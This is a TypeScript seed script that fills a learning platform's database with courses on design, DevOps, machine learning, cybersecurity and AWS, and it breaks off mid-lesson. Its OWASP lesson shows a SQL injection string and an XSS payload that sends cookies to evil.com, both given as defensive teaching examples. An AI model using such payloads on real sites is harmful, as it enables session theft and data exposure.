import mongoose from 'mongoose';
import dotenv from 'dotenv';
import { Course } from './models/Course';
dotenv.config();

const MONGO_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/pugi';

const tutors = [
  { id: '6a35043e6cdfe71c5b12c2ee', name: 'Amara Okafor' },
  { id: '6a35043e6cdfe71c5b12c2ef', name: 'David Mensah' },
  { id: '6a35043e6cdfe71c5b12c2f0', name: 'Leah Johnson' },
  { id: '6a35043e6cdfe71c5b12c2f1', name: 'Victor Chen' },
  { id: '6a35043e6cdfe71c5b12c2f2', name: 'Demo Tutor' },
];

const newCourses = [
  // ── DESIGN ───────────────────────────────────────────────────────────────
  {
    title: 'UI/UX Design Fundamentals',
    description: 'Learn the principles of great user interface and experience design. Cover layout, typography, color theory, wireframing, and prototyping.',
    thumbnail: 'https://placehold.co/600x340/ff6b6b/fff?text=UI/UX+Design',
    category: 'Design',
    level: 'beginner',
    duration: '10 hours',
    rating: 4.7,
    status: 'published',
    modules: [
      {
        title: 'Design Principles',
        order: 0,
        lessons: [
          {
            title: 'The 4 Core Design Principles',
            duration: '20 min',
            type: 'content',
            order: 0,
            content: `# The 4 Core Design Principles

Good design is not about making things look pretty — it is about making things work clearly. Four principles underpin almost every good design decision.

## 1. Contrast

Contrast makes elements stand out from each other. It guides the eye and creates hierarchy.

\`\`\`
Bad:  Light gray text on white background
Good: Dark gray or black text on white background

Bad:  Two similar font sizes for heading and body
Good: 32px heading, 16px body — clear difference
\`\`\`

Use contrast for:
- Text readability (minimum 4.5:1 ratio for WCAG AA)
- Highlighting primary buttons vs secondary
- Separating sections visually

## 2. Repetition

Repeat visual elements throughout your design to create consistency and unity.

- Same button style across all screens
- Same font family throughout
- Same spacing unit (e.g. 8px grid)
- Same icon style (all outline or all filled)

Repetition = brand recognition + predictability for users.

## 3. Alignment

Nothing should be placed arbitrarily. Every element should have a visual connection to something else.

\`\`\`
Bad:  Elements scattered randomly on the page
Good: Everything aligned to an invisible grid

Bad:  Mix of left-aligned and center-aligned text in one section
Good: Consistent alignment choice per section
\`\`\`

## 4. Proximity

Group related items together. Separate unrelated items.

\`\`\`
Bad:  Label far away from its input field
Good: Label directly above or beside its input

Bad:  All elements evenly spaced regardless of relationship
Good: Related elements closer together, unrelated elements further apart
\`\`\`

## Applying all four

\`\`\`
A good card component:
- CONTRAST:   Bold title vs light description text
- REPETITION: Same card style used across the entire list
- ALIGNMENT:  Text, image, and button all left-aligned on a grid
- PROXIMITY:  Title and description close together, button spaced below
\`\`\``,
            codeExample: `/* Applying design principles in CSS */

/* CONTRAST — readable text */
.card {
  background: #ffffff;
  color: #111827;        /* high contrast */
}
.card .subtitle {
  color: #6b7280;        /* softer but still readable */
}

/* REPETITION — consistent spacing scale */
:root {
  --space-1: 4px;
  --space-2: 8px;
  --space-3: 12px;
  --space-4: 16px;
  --space-6: 24px;
  --space-8: 32px;
}

/* ALIGNMENT — grid system */
.container {
  display: grid;
  grid-template-columns: repeat(12, 1fr);
  gap: var(--space-4);
  max-width: 1200px;
  margin: 0 auto;
  padding: 0 var(--space-4);
}

/* PROXIMITY — group related elements */
.form-field {
  display: flex;
  flex-direction: column;
  gap: var(--space-1);   /* label and input close together */
  margin-bottom: var(--space-4); /* fields separated from each other */
}`,
          },
          {
            title: 'Color Theory for UI',
            duration: '22 min',
            type: 'content',
            order: 1,
            content: `# Color Theory for UI

Color is one of the most powerful tools in a designer's toolkit. Used well it communicates meaning, guides attention, and builds trust.

## The 60-30-10 rule

\`\`\`
60% — Dominant/neutral color (backgrounds, surfaces)
30% — Secondary color (cards, sidebars, text)
10% — Accent color (buttons, links, highlights)
\`\`\`

Example for PUGI:
- 60% White / Light gray backgrounds
- 30% Dark gray text and borders
- 10% Blue (#3b82f6) for buttons and active states

## Color meanings

| Color  | Associations | Use in UI |
|--------|-------------|-----------|
| Blue   | Trust, calm, professional | Primary actions, links |
| Green  | Success, growth, safe | Success states, progress |
| Red    | Danger, error, urgent | Errors, destructive actions |
| Yellow | Warning, attention | Warnings, highlights |
| Gray   | Neutral, subtle | Text, borders, backgrounds |

## Building a color palette

Start with one brand color and derive the rest:

\`\`\`css
:root {
  /* Primary — your brand color */
  --blue-50:  #eff6ff;
  --blue-100: #dbeafe;
  --blue-500: #3b82f6;  /* main */
  --blue-600: #2563eb;  /* hover */
  --blue-700: #1d4ed8;  /* active/pressed */

  /* Semantic colors */
  --color-success: #10b981;
  --color-warning: #f59e0b;
  --color-error:   #ef4444;
  --color-info:    #3b82f6;

  /* Neutrals */
  --gray-50:  #f9fafb;
  --gray-100: #f3f4f6;
  --gray-500: #6b7280;
  --gray-900: #111827;
}
\`\`\`

## Dark mode colors

\`\`\`css
/* Light mode */
--bg-primary:   #ffffff;
--text-primary: #111827;
--border:       #e5e7eb;

/* Dark mode */
--bg-primary:   #1f2937;
--text-primary: #f9fafb;
--border:       #374151;
\`\`\``,
            codeExample: `/* Complete button color system */
.btn {
  padding: 8px 16px;
  border-radius: 8px;
  font-weight: 500;
  cursor: pointer;
  border: none;
  transition: background 150ms ease;
}

/* Primary */
.btn-primary {
  background: #3b82f6;
  color: #ffffff;
}
.btn-primary:hover  { background: #2563eb; }
.btn-primary:active { background: #1d4ed8; }

/* Secondary */
.btn-secondary {
  background: #f3f4f6;
  color: #374151;
}
.btn-secondary:hover { background: #e5e7eb; }

/* Danger */
.btn-danger {
  background: #ef4444;
  color: #ffffff;
}
.btn-danger:hover { background: #dc2626; }

/* Ghost */
.btn-ghost {
  background: transparent;
  color: #3b82f6;
  border: 1px solid #3b82f6;
}
.btn-ghost:hover { background: #eff6ff; }`,
          },
        ],
        quiz: {
          title: 'Design Principles Quiz',
          passingScore: 70,
          maxAttempts: 3,
          questions: [
            {
              prompt: 'Which design principle groups related elements close together?',
              options: ['Contrast', 'Repetition', 'Alignment', 'Proximity'],
              correctOptionIndex: 3,
              explanation: 'Proximity groups related items together to show their relationship.',
              points: 1,
            },
            {
              prompt: 'In the 60-30-10 color rule, what percentage is used for accent colors like buttons?',
              options: ['60%', '30%', '10%', '20%'],
              correctOptionIndex: 2,
              explanation: '10% is the accent color — used sparingly for CTAs and highlights.',
              points: 1,
            },
            {
              prompt: 'What color is typically used for error states in UI?',
              options: ['Blue', 'Green', 'Yellow', 'Red'],
              correctOptionIndex: 3,
              explanation: 'Red communicates danger and errors universally.',
              points: 1,
            },
          ],
        },
      },
    ],
  },

  // ── DEVOPS ───────────────────────────────────────────────────────────────
  {
    title: 'DevOps & CI/CD Fundamentals',
    description: 'Learn how to automate software delivery with Docker, GitHub Actions, and CI/CD pipelines. Ship code faster and more reliably.',
    thumbnail: 'https://placehold.co/600x340/0ea5e9/fff?text=DevOps',
    category: 'DevOps',
    level: 'intermediate',
    duration: '12 hours',
    rating: 4.6,
    status: 'published',
    modules: [
      {
        title: 'Docker Fundamentals',
        order: 0,
        lessons: [
          {
            title: 'Containers and Docker',
            duration: '25 min',
            type: 'content',
            order: 0,
            content: `# Containers and Docker

Docker packages your application and all its dependencies into a container — a lightweight, portable unit that runs identically everywhere.

## Why Docker?

\`\`\`
Without Docker:
"It works on my machine" → fails in production
Different Node versions → different behaviour
Missing env variables → crashes

With Docker:
Same image → same behaviour everywhere
Dev, staging, production all identical
New team member: docker compose up — done
\`\`\`

## Key concepts

- **Image** — a blueprint for a container (read-only)
- **Container** — a running instance of an image
- **Dockerfile** — instructions to build an image
- **Registry** — storage for images (Docker Hub, GitHub Container Registry)
- **docker-compose** — run multiple containers together

## Your first Dockerfile

\`\`\`dockerfile
# Start from official Node.js image
FROM node:20-alpine

# Set working directory inside container
WORKDIR /app

# Copy package files first (for layer caching)
COPY package*.json ./

# Install dependencies
RUN npm ci --only=production

# Copy source code
COPY . .

# Build TypeScript
RUN npm run build

# Expose the port your app listens on
EXPOSE 3001

# Command to run when container starts
CMD ["node", "dist/index.js"]
\`\`\`

## Essential Docker commands

\`\`\`bash
# Build an image
docker build -t pugi-backend:latest .

# Run a container
docker run -p 3001:3001 --env-file .env pugi-backend:latest

# List running containers
docker ps

# Stop a container
docker stop <container-id>

# View logs
docker logs <container-id> -f

# Shell into a running container
docker exec -it <container-id> sh

# List images
docker images

# Remove unused resources
docker system prune
\`\`\`

## docker-compose.yml

\`\`\`yaml
version: '3.8'
services:
  backend:
    build: ./backend
    ports:
      - "3001:3001"
    environment:
      - MONGODB_URI=mongodb://mongo:27017/pugi
      - JWT_SECRET=your_secret
    depends_on:
      - mongo

  frontend:
    build: ./PUGI
    ports:
      - "5174:80"
    depends_on:
      - backend

  mongo:
    image: mongo:7
    ports:
      - "27017:27017"
    volumes:
      - mongo_data:/data/db

volumes:
  mongo_data:
\`\`\`

\`\`\`bash
docker compose up -d      # start all services
docker compose down       # stop all services
docker compose logs -f    # tail all logs
\`\`\``,
            codeExample: `# Multi-stage Dockerfile for smaller production image
FROM node:20-alpine AS builder

WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

# Production stage — only copy what we need
FROM node:20-alpine AS production

WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

COPY --from=builder /app/dist ./dist

RUN addgroup -S appgroup && adduser -S appuser -G appgroup
USER appuser

EXPOSE 3001
CMD ["node", "dist/index.js"]

# Result: image is ~150MB instead of ~900MB`,
          },
          {
            title: 'GitHub Actions CI/CD',
            duration: '28 min',
            type: 'content',
            order: 1,
            content: `# GitHub Actions CI/CD

GitHub Actions automates your workflow — run tests, build Docker images, and deploy on every push.

## How it works

\`\`\`
Push code to GitHub
    ↓
GitHub Actions triggers a workflow
    ↓
Runs jobs: lint → test → build → deploy
    ↓
Notifies you of success or failure
\`\`\`

## Workflow file structure

\`\`\`yaml
# .github/workflows/ci.yml
name: CI/CD Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'

      - name: Install dependencies
        run: npm ci

      - name: Run tests
        run: npm test

      - name: Build
        run: npm run build
\`\`\`

## Full pipeline with Docker deploy

\`\`\`yaml
name: Deploy to Production

on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Log in to Docker Hub
        uses: docker/login-action@v3
        with:
          username: \${{ secrets.DOCKER_USERNAME }}
          password: \${{ secrets.DOCKER_PASSWORD }}

      - name: Build and push image
        uses: docker/build-push-action@v5
        with:
          push: true
          tags: yourusername/pugi-backend:latest

      - name: Deploy to server
        uses: appleboy/ssh-action@v1
        with:
          host: \${{ secrets.SERVER_HOST }}
          username: \${{ secrets.SERVER_USER }}
          key: \${{ secrets.SSH_PRIVATE_KEY }}
          script: |
            docker pull yourusername/pugi-backend:latest
            docker compose up -d --no-deps backend
\`\`\`

## Environment secrets

Never hardcode secrets in workflow files. Store them in:
**GitHub repo → Settings → Secrets and variables → Actions**

\`\`\`
DOCKER_USERNAME
DOCKER_PASSWORD
SERVER_HOST
SERVER_USER
SSH_PRIVATE_KEY
JWT_SECRET
MONGODB_URI
\`\`\``,
            codeExample: `# .github/workflows/backend-ci.yml
name: Backend CI

on:
  push:
    paths:
      - 'backend/**'
  pull_request:
    paths:
      - 'backend/**'

jobs:
  lint-and-build:
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: backend

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
          cache-dependency-path: backend/package-lock.json

      - name: Install
        run: npm ci

      - name: Type check
        run: npx tsc --noEmit

      - name: Build
        run: npm run build

      - name: Upload build artifact
        uses: actions/upload-artifact@v4
        with:
          name: backend-dist
          path: backend/dist/`,
          },
        ],
        quiz: {
          title: 'DevOps Quiz',
          passingScore: 70,
          maxAttempts: 3,
          questions: [
            {
              prompt: 'What is a Docker image?',
              options: [
                'A running instance of a container',
                'A read-only blueprint used to create containers',
                'A virtual machine',
                'A GitHub repository',
              ],
              correctOptionIndex: 1,
              explanation: 'An image is the blueprint. A container is a running instance of that image.',
              points: 1,
            },
            {
              prompt: 'Where should you store secrets like API keys in GitHub Actions?',
              options: [
                'Directly in the workflow YAML file',
                'In a .env file committed to the repo',
                'In GitHub repository Secrets',
                'In the Docker image',
              ],
              correctOptionIndex: 2,
              explanation: 'GitHub Secrets are encrypted and injected at runtime — never commit secrets.',
              points: 1,
            },
            {
              prompt: 'What does `docker compose up -d` do?',
              options: [
                'Downloads Docker',
                'Starts all services defined in docker-compose.yml in the background',
                'Deletes all containers',
                'Builds images only without starting them',
              ],
              correctOptionIndex: 1,
              explanation: '-d runs containers in detached (background) mode.',
              points: 1,
            },
          ],
        },
      },
    ],
  },

  // ── AI/ML ─────────────────────────────────────────────────────────────────
  {
    title: 'AI & Machine Learning Fundamentals',
    description: 'Understand how AI and machine learning work. Learn key concepts, algorithms, and how to build your first ML models with Python.',
    thumbnail: 'https://placehold.co/600x340/8b5cf6/fff?text=AI+%26+ML',
    category: 'AI/ML',
    level: 'intermediate',
    duration: '14 hours',
    rating: 4.9,
    status: 'published',
    modules: [
      {
        title: 'Machine Learning Concepts',
        order: 0,
        lessons: [
          {
            title: 'How Machine Learning Works',
            duration: '25 min',
            type: 'content',
            order: 0,
            content: `# How Machine Learning Works

Machine learning is a way of teaching computers to learn from data instead of explicit programming.

## Traditional programming vs ML

\`\`\`
Traditional:
Rules + Data → Output
(You write: if score > 90, grade = A)

Machine Learning:
Data + Output → Rules
(The model learns: what patterns predict an A?)
\`\`\`

## Types of Machine Learning

### Supervised Learning
The model learns from labeled examples.

\`\`\`
Input: [hours studied, sleep hours, past grades]
Label: [passed / failed]

Model learns the relationship and predicts for new students.

Examples: spam detection, house price prediction, image classification
\`\`\`

### Unsupervised Learning
The model finds patterns in unlabeled data.

\`\`\`
Input: customer purchase history (no labels)
Model discovers: 3 customer segments exist

Examples: customer clustering, anomaly detection, recommendation systems
\`\`\`

### Reinforcement Learning
The model learns by trial and error with rewards.

\`\`\`
Agent takes actions → receives reward or penalty
Over time, learns to maximize total reward

Examples: game playing (AlphaGo), robotics, trading bots
\`\`\`

## The ML workflow

\`\`\`
1. Define the problem
   What are you predicting? What data do you have?

2. Collect and clean data
   Remove duplicates, handle missing values, fix errors

3. Explore the data (EDA)
   Understand distributions, correlations, outliers

4. Prepare features
   Encode categories, scale numbers, create new features

5. Choose and train a model
   Linear regression, decision tree, neural network...

6. Evaluate the model
   Accuracy, precision, recall, F1 score

7. Improve
   Tune hyperparameters, add data, try different models

8. Deploy
   Serve predictions via an API
\`\`\`

## Key terminology

- **Feature** — an input variable (column in your dataset)
- **Label/Target** — what you are predicting
- **Training set** — data the model learns from (80%)
- **Test set** — data used to evaluate (20%)
- **Overfitting** — model memorises training data, fails on new data
- **Underfitting** — model too simple to capture patterns
- **Hyperparameters** — settings you choose before training`,
            codeExample: `import numpy as np

# Simple linear regression from scratch
# Predicting exam score from hours studied

hours_studied = np.array([1, 2, 3, 4, 5, 6, 7, 8])
exam_scores   = np.array([50, 55, 65, 70, 75, 82, 88, 95])

# Calculate slope and intercept
n = len(hours_studied)
slope     = (n * np.sum(hours_studied * exam_scores) - np.sum(hours_studied) * np.sum(exam_scores)) / \
            (n * np.sum(hours_studied**2) - np.sum(hours_studied)**2)
intercept = (np.sum(exam_scores) - slope * np.sum(hours_studied)) / n

print(f"Slope:     {slope:.2f}")
print(f"Intercept: {intercept:.2f}")
print(f"Formula:   score = {slope:.2f} * hours + {intercept:.2f}")

# Predict
for hours in [3, 5, 9, 10]:
    prediction = slope * hours + intercept
    print(f"Study {hours}h → predicted score: {prediction:.1f}")`,
          },
          {
            title: 'Neural Networks and Deep Learning',
            duration: '30 min',
            type: 'content',
            order: 1,
            content: `# Neural Networks and Deep Learning

Neural networks are inspired by the human brain. They learn complex patterns through layers of interconnected nodes.

## Structure of a neural network

\`\`\`
Input Layer    Hidden Layers    Output Layer
   [x1]  ──→  [node] [node]  ──→  [prediction]
   [x2]  ──→  [node] [node]  ──→
   [x3]  ──→  [node] [node]  ──→

Each connection has a weight.
Each node applies an activation function.
Training adjusts the weights to minimize error.
\`\`\`

## How training works

\`\`\`
1. Forward pass
   Input → through layers → prediction

2. Calculate loss
   How wrong is the prediction? (e.g. mean squared error)

3. Backward pass (backpropagation)
   Calculate how much each weight contributed to the error

4. Update weights (gradient descent)
   Adjust weights to reduce error

5. Repeat for all training examples (one epoch)
6. Repeat for many epochs until loss is low
\`\`\`

## Common architectures

\`\`\`
Feedforward (MLP)  — tabular data, classification
CNN                — images, video
RNN / LSTM         — sequences, time series, text
Transformer        — text, code (GPT, BERT)
GAN                — generating images, audio
\`\`\`

## Building a neural network with Python

\`\`\`python
import tensorflow as tf
from tensorflow import keras

model = keras.Sequential([
    keras.layers.Dense(128, activation='relu', input_shape=(10,)),
    keras.layers.Dropout(0.2),
    keras.layers.Dense(64, activation='relu'),
    keras.layers.Dropout(0.2),
    keras.layers.Dense(1, activation='sigmoid'),  # binary classification
])

model.compile(
    optimizer='adam',
    loss='binary_crossentropy',
    metrics=['accuracy'],
)

model.summary()

history = model.fit(
    X_train, y_train,
    epochs=50,
    batch_size=32,
    validation_split=0.2,
    verbose=1,
)
\`\`\``,
            codeExample: `# Neural network from scratch (no libraries)
import numpy as np

def sigmoid(x):
    return 1 / (1 + np.exp(-x))

def sigmoid_derivative(x):
    return x * (1 - x)

# XOR problem — not linearly separable
X = np.array([[0,0], [0,1], [1,0], [1,1]])
y = np.array([[0], [1], [1], [0]])

np.random.seed(42)
w1 = np.random.randn(2, 4)   # input → hidden
w2 = np.random.randn(4, 1)   # hidden → output

lr = 0.5
for epoch in range(10000):
    # Forward
    h = sigmoid(X @ w1)
    out = sigmoid(h @ w2)

    # Backward
    err2 = y - out
    d2   = err2 * sigmoid_derivative(out)

    err1 = d2 @ w2.T
    d1   = err1 * sigmoid_derivative(h)

    # Update
    w2 += h.T @ d2 * lr
    w1 += X.T @ d1 * lr

    if epoch % 2000 == 0:
        loss = np.mean(np.square(y - out))
        print(f"Epoch {epoch:5d} | Loss: {loss:.4f}")

print("\\nFinal predictions:")
for i, (xi, yi) in enumerate(zip(X, y)):
    print(f"  {xi} → {out[i][0]:.3f} (expected {yi[0]})")`,
          },
        ],
        quiz: {
          title: 'AI & ML Quiz',
          passingScore: 70,
          maxAttempts: 3,
          questions: [
            {
              prompt: 'In supervised learning, what is a "label"?',
              options: [
                'A feature column in the dataset',
                'The output variable the model is trying to predict',
                'A type of neural network layer',
                'A hyperparameter setting',
              ],
              correctOptionIndex: 1,
              explanation: 'Labels are the correct answers the model learns to predict.',
              points: 1,
            },
            {
              prompt: 'What is overfitting?',
              options: [
                'The model is too simple to learn patterns',
                'The model memorises training data and performs poorly on new data',
                'The model trains too slowly',
                'The dataset is too large',
              ],
              correctOptionIndex: 1,
              explanation: 'Overfitting means the model learned the training data too well including its noise.',
              points: 1,
            },
            {
              prompt: 'What does backpropagation do in neural network training?',
              options: [
                'Loads the training data',
                'Makes predictions on test data',
                'Calculates how much each weight contributed to the error and updates them',
                'Normalises the input features',
              ],
              correctOptionIndex: 2,
              explanation: 'Backpropagation computes gradients and updates weights to minimize loss.',
              points: 1,
            },
          ],
        },
      },
    ],
  },

  // ── CYBERSECURITY ─────────────────────────────────────────────────────────
  {
    title: 'Cybersecurity Fundamentals',
    description: 'Learn how to protect applications and systems from attacks. Cover OWASP Top 10, secure coding, authentication, and penetration testing basics.',
    thumbnail: 'https://placehold.co/600x340/dc2626/fff?text=Cybersecurity',
    category: 'Cybersecurity',
    level: 'intermediate',
    duration: '11 hours',
    rating: 4.8,
    status: 'published',
    modules: [
      {
        title: 'Web Security Essentials',
        order: 0,
        lessons: [
          {
            title: 'OWASP Top 10 Vulnerabilities',
            duration: '30 min',
            type: 'content',
            order: 0,
            content: `# OWASP Top 10 Vulnerabilities

The OWASP Top 10 is the standard list of the most critical web application security risks.

## 1. Injection (SQL, NoSQL, Command)

Attacker injects malicious code into a query or command.

\`\`\`sql
-- Vulnerable:
"SELECT * FROM users WHERE email = '" + email + "'"

-- Attacker input: ' OR '1'='1
-- Result: SELECT * FROM users WHERE email = '' OR '1'='1'
-- Returns ALL users!

-- Safe — use parameterized queries:
db.query("SELECT * FROM users WHERE email = ?", [email])
\`\`\`

## 2. Broken Authentication

Weak passwords, no rate limiting, predictable tokens.

\`\`\`
Bad:
- Allowing "password123" as a password
- No lockout after failed login attempts
- JWT signed with "secret" as the key

Good:
- Minimum password requirements + strength meter
- Lock account after 5 failed attempts
- JWT signed with long random secret, short expiry
\`\`\`

## 3. Cross-Site Scripting (XSS)

Attacker injects malicious JavaScript into your page.

\`\`\`html
<!-- Vulnerable — renders raw HTML -->
<div>{userInput}</div>

<!-- Attacker input: <script>document.location='https://evil.com?c='+document.cookie</script> -->
<!-- Steals session cookies! -->

<!-- Safe — React escapes by default -->
<div>{userInput}</div>  {/* React automatically escapes */}

<!-- Dangerous in React — only use with trusted content -->
<div dangerouslySetInnerHTML={{ __html: userInput }} />
\`\`\`

## 4. Insecure Direct Object References (IDOR)

User accesses objects they should not have access to.

\`\`\`js
// Vulnerable:
app.get('/api/invoices/:id', async (req, res) => {
  const invoice = await Invoice.findById(req.params.id);
  res.json(invoice); // Any user can access any invoice!
});

// Safe — check ownership:
app.get('/api/invoices/:id', authenticate, async (req, res) => {
  const invoice = await Invoice.findOne({
    _id: req.params.id,
    userId: req.user.id  // must belong to this user
  });
  if (!invoice) return res.status(404).json({ message: 'Not found' });
  res.json(invoice);
});
\`\`\`

## 5. Security Misconfiguration

\`\`\`
Bad:
- Default credentials (admin/admin)
- Stack traces exposed in production
- CORS set to allow all origins: *
- .env file committed to Git

Good:
- Change all defaults immediately
- NODE_ENV=production hides error details
- CORS whitelist specific origins
- .gitignore includes .env
\`\`\``,
            codeExample: `// Security checklist for Express APIs

import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
import mongoSanitize from 'express-mongo-sanitize';

// 1. Helmet sets secure HTTP headers
app.use(helmet());

// 2. Rate limiting prevents brute force
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100,                  // max 100 requests per window
  message: 'Too many requests, please try again later.',
});
app.use('/api', limiter);

// Stricter limit for auth routes
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: 'Too many login attempts, try again in 15 minutes.',
});
app.use('/api/auth/login', authLimiter);

// 3. Sanitize MongoDB queries (prevent NoSQL injection)
app.use(mongoSanitize());

// 4. CORS — only allow your frontend
app.use(cors({
  origin: process.env.FRONTEND_URL || 'http://localhost:5174',
  credentials: true,
}));

// 5. Hide that you're using Express
app.disable('x-powered-by');`,
          },
          {
            title: 'Secure Authentication Patterns',
            duration: '25 min',
            type: 'content',
            order: 1,
            content: `# Secure Authentication Patterns

## Password security

\`\`\`js
import bcrypt from 'bcryptjs';

// NEVER store plain text passwords
// BAD:
user.password = req.body.password;

// GOOD: hash with bcrypt (cost factor 12)
user.password = await bcrypt.hash(req.body.password, 12);

// Verify:
const valid = await bcrypt.compare(inputPassword, user.password);
\`\`\`

## Secure JWT practices

\`\`\`js
// BAD:
jwt.sign({ id: user.id }, 'secret', { expiresIn: '30d' });

// GOOD:
jwt.sign(
  { id: user.id, role: user.role },
  process.env.JWT_SECRET,      // long random string
  { expiresIn: '15m' }         // short lived
);

// Use refresh tokens for longer sessions
// Store refresh token hash in database
// Rotate refresh token on every use
\`\`\`

## Input validation

\`\`\`js
import { z } from 'zod';

const registerSchema = z.object({
  name:     z.string().min(2).max(50),
  email:    z.string().email(),
  password: z.string()
    .min(8)
    .regex(/[A-Z]/, 'Must contain uppercase')
    .regex(/[0-9]/, 'Must contain number')
    .regex(/[^a-zA-Z0-9]/, 'Must contain special character'),
  role: z.enum(['learner', 'tutor']).optional(),
});

router.post('/register', async (req, res) => {
  const result = registerSchema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({ errors: result.error.flatten() });
  }
  // proceed with validated data
  const { name, email, password } = result.data;
});
\`\`\`

## HTTPS and cookies

\`\`\`js
// If storing tokens in cookies instead of localStorage:
res.cookie('refreshToken', token, {
  httpOnly: true,    // JS cannot access it (prevents XSS theft)
  secure: true,      // HTTPS only
  sameSite: 'strict', // prevents CSRF
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
});
\`\`\``,
            codeExample: `import { z } from 'zod';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';

// Comprehensive auth validation
const loginSchema = z.object({
  email:    z.string().email('Invalid email format'),
  password: z.string().min(1, 'Password required'),
});

async function secureLogin(req: any, res: any) {
  // 1. Validate input
  const result = loginSchema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({ message: 'Invalid input' });
    // Generic message — don't reveal which field failed
  }

  const { email, password } = result.data;

  // 2. Find user
  const user = await User.findOne({ email }).select('+password');

  // 3. Always hash compare even if user not found (prevent timing attacks)
  const dummyHash = '$2a$12$dummy.hash.to.prevent.timing.attacks.here';
  const valid = user
    ? await bcrypt.compare(password, user.password)
    : await bcrypt.compare(password, dummyHash);

  // 4. Same error for wrong email OR wrong password
  if (!user || !valid) {
    return res.status(401).json({ message: 'Invalid email or password' });
  }

  // 5. Check email verified
  if (!user.emailVerified) {
    return res.status(403).json({ message: 'Please verify your email first' });
  }

  // 6. Sign token
  const token = jwt.sign(
    { id: user.id, role: user.role },
    process.env.JWT_SECRET!,
    { expiresIn: '15m' }
  );

  res.json({ accessToken: token });
}`,
          },
        ],
        quiz: {
          title: 'Cybersecurity Quiz',
          passingScore: 70,
          maxAttempts: 3,
          questions: [
            {
              prompt: 'What is SQL injection?',
              options: [
                'A way to speed up database queries',
                'An attacker inserting malicious SQL into a query to manipulate the database',
                'A method to back up a database',
                'A technique for indexing database columns',
              ],
              correctOptionIndex: 1,
              explanation: 'SQL injection exploits unsanitized input to run arbitrary SQL commands.',
              points: 1,
            },
            {
              prompt: 'Why should passwords be hashed with bcrypt instead of MD5 or SHA1?',
              options: [
                'bcrypt is faster',
                'MD5 and SHA1 produce shorter hashes',
                'bcrypt is intentionally slow and has a cost factor making brute force impractical',
                'bcrypt is built into all databases',
              ],
              correctOptionIndex: 2,
              explanation: 'bcrypt\'s cost factor makes it slow enough that brute-forcing hashes is computationally expensive.',
              points: 1,
            },
            {
              prompt: 'What does the httpOnly cookie flag do?',
              options: [
                'Makes the cookie expire after the session',
                'Restricts the cookie to HTTPS connections only',
                'Prevents JavaScript from accessing the cookie, protecting against XSS',
                'Limits the cookie to the same domain',
              ],
              correctOptionIndex: 2,
              explanation: 'httpOnly prevents JS from reading the cookie, so XSS attacks cannot steal it.',
              points: 1,
            },
          ],
        },
      },
    ],
  },

  // ── CLOUD ─────────────────────────────────────────────────────────────────
  {
    title: 'Cloud Computing with AWS',
    description: 'Learn cloud fundamentals and deploy real applications on AWS. Cover EC2, S3, RDS, Lambda, and infrastructure as code.',
    thumbnail: 'https://placehold.co/600x340/f59e0b/fff?text=Cloud+AWS',
    category: 'Cloud',
    level: 'intermediate',
    duration: '13 hours',
    rating: 4.7,
    status: 'published',
    modules: [
      {
        title: 'AWS Core Services',
        order: 0,
        lessons: [
          {
            title: 'Cloud Fundamentals and AWS Overview',
            duration: '22 min',
            type: 'content',
            order: 0,
            content: `# Cloud Fundamentals and AWS Overview

Cloud computing delivers computing resources — servers, storage, databases, networking — over the internet on demand.

## Why cloud?

\`\`\`
Traditional (On-premise):
- Buy physical servers upfront
- Pay for capacity whether used or not
- You manage hardware, cooling, power
- Scaling takes weeks

Cloud:
- Pay only for what you use
- Scale in seconds
- Provider manages hardware
- Global reach instantly
\`\`\`

## Cloud service models

\`\`\`
IaaS (Infrastructure as a Service)
  You manage: OS, runtime, apps, data
  Provider manages: virtualisation, servers, storage
  Example: AWS EC2, Azure VMs

PaaS (Platform as a Service)
  You manage: apps and data only
  Provider manages: everything else
  Example: Heroku, AWS Elastic Beanstalk

SaaS (Software as a Service)
  You manage: nothing
  Provider manages: everything
  Example: Gmail, Slack, GitHub
\`\`\`

## Key AWS Services

| Service | Purpose |
|---------|---------|
| EC2 | Virtual servers |
| S3 | Object storage (files, images) |
| RDS | Managed relational databases |
| Lambda | Serverless functions |
| CloudFront | CDN for fast global delivery |
| Route 53 | DNS management |
| VPC | Private network in the cloud |
| IAM | Identity and access management |
| ECS/EKS | Container orchestration |

## Regions and Availability Zones

\`\`\`
Region: Geographic area (e.g. us-east-1, eu-west-1)
  ↓
Availability Zones: Isolated data centres within a region
  ↓
Deploy across multiple AZs for high availability

Rule: Always deploy in at least 2 AZs for production
\`\`\`

## AWS Free Tier

New accounts get 12 months free on:
- EC2 t2.micro (750 hours/month)
- S3 5GB storage
- RDS db.t2.micro (750 hours/month)
- Lambda 1 million requests/month`,
            codeExample: `# AWS CLI — essential commands

# Configure credentials
aws configure
# Prompts for: Access Key ID, Secret Key, Region, Output format

# S3 — object storage
aws s3 ls                          # list buckets
aws s3 mb s3://my-pugi-bucket      # create bucket
aws s3 cp file.txt s3://my-bucket/ # upload file
aws s3 sync ./dist s3://my-bucket/ # sync folder (great for frontend deploy)
aws s3 rm s3://my-bucket/file.txt  # delete file

# EC2 — virtual servers
aws ec2 describe-instances         # list instances
aws ec2 start-instances --instance-ids i-1234567890abcdef0
aws ec2 stop-instances  --instance-ids i-1234567890abcdef0

# Lambda — serverless functions
aws lambda list-functions
aws lambda invoke \
  --function-name my-function \
  --payload '{"name":"PUGI"}' \
  response.json

# IAM — access management
aws iam list-users
aws iam create-user --user-name deploy-bot`,
          },
          {
            title: 'Deploying a Node.js App to AWS',
            duration: '30 min',
            type: 'content',
            order: 1,
